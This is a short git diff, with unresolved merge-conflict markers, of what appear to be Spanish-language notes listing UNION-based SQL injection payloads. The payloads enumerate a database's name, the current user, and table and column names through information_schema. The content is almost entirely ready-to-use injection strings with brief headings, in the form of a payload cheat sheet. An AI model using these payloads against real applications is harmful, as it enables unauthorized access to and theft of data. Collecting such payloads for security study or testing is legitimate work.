@@ -11,9 +11,18 @@ Para obtener nombres de las tablas
 
 Para obtener estructura de la bd
 
+<<<<<<< HEAD
 1 UNION SELECT table_name,table_name, table_name,table_name FROM information_schema.tables;
 1 UNION SELECT 1,2,concat(table_schema, table_name),4 FROM information_schema.tables;
 
 Nombre de la DB
 1 UNION ALL SELECT 1,2,DATABASE(),4
 1 UNION ALL SELECT 1,2,user(),4
+=======
+1 UNION SELECT 1,2,3,4;
+-1 UNION SELECT 1,2,user(),4;
+-1 UNION SELECT 1,2,database(),4;
+-1 UNION SELECT 1,2,concat(table_schema, table_name),4 FROM information_schema.tables;
+-1 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()
+-1 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=database()
+>>>>>>> b33c1f8ac90901499165153188c0d3589e81570b
